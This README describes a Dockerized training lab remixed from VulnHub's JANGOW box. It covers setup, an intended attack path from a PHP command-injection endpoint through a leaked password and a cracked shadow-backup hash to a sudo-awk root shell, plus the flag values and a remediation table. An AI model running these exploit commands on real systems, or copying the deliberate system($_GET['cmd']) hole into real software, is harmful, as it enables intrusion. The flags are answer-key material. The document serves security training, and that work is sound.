# JANGOW-REMIX — Dockerized boot-to-root lab

A rebuild of the VulnHub **JANGOW: 1.0.1** box, with the DirtyCow kernel finale
replaced by a **credential-reuse + sudo-misconfig** chain. The submitted
*Celadon* site is the web front, `connection.php` is the injection point.

## Run

```bash
docker compose up --build -d
```

| Service | Reach it at |
|---------|-------------|
| Web | http://localhost:8080/site/ |
| SSH | `ssh jangow01@localhost -p 2222` |
| FTP | `ftp localhost 2121` |

Tear down: `docker compose down`

## Intended attack path

```
connection.php?cmd=cat /var/www/html/site/.backup   -> leaks jangow01:abygurl69
         |
SSH in as jangow01            (stage 1)
         |
find /var/backups/shadow.bak  -> readable backup of /etc/shadow
         |
spot a 2nd non-root user 'butcher', pull its hash
         |
crack hash (rockyou -> 'microphone'), su butcher
         |
sudo -l -> (root) NOPASSWD: /usr/bin/awk
         |
sudo awk 'BEGIN{system("/bin/sh")}'   -> root
```

## Flags (each readable only by its directory owner, `0400`)

| Stage | File | Owner | Flag |
|-------|------|-------|------|
| user | `/home/jangow01/user.txt` | jangow01 | `HEHE{sudo_wont_save_you_this_time}` |
| user2 | `/home/butcher/user2.txt` | butcher | `ROOTLESS{1_4m_1n}` |
| root | `/root/proof.txt` | root | `ROOTED{n0w_1_4m_g0d}` |

No stage can be skipped: `/home/butcher` is `0700`, so a jangow01-level shell
cannot read `user2.txt` without first becoming butcher; `/root/proof.txt`
needs the sudo-awk escalation.

## Walkthrough of each exploit

**Web RCE.** `connection.php` runs `system($_GET['cmd'])` unsanitised:
`http://localhost:8080/site/connection.php?cmd=id` returns `www-data`.
Used only to read the `.backup` credential leak.

**Shadow enumeration.** Real `/etc/shadow` stays `0640 root:shadow`
(unreadable). The planted `/var/backups/shadow.bak` (`0644`) is the admin
mistake that exposes `butcher`'s md5-crypt hash.

**Crack.** `butcher`'s password `microphone` is a rockyou.txt entry:
`john --wordlist=/usr/share/wordlists/rockyou.txt butcher.hash`
(or `hashcat -m 500`).

**Sudo awk LPE.** The textbook GTFOBins entry:
```
sudo awk 'BEGIN{system("/bin/sh")}'
```
`awk` running as root spawns a root shell -> `/root/proof.txt`.

## Remediation mapping (for the defensive half of the lesson)

| Weakness | Fix |
|----------|-----|
| `system($_GET['cmd'])` | never pass user input to a shell; `escapeshellarg`, allow-lists, or drop the feature |
| creds in web-readable `.backup` | keep secrets out of webroot; restrict perms; rotate |
| world-readable shadow backup | `0600 root:root` on backups, store off-host |
| password reuse / weak password | enforce strong unique passwords, disallow dictionary words |
| `NOPASSWD: /usr/bin/awk` | never grant sudo on shell-capable binaries; scope to exact non-interactive commands |

*Closed lab / training use only. Every bug here is intentional and must never
reach a real deployment.*
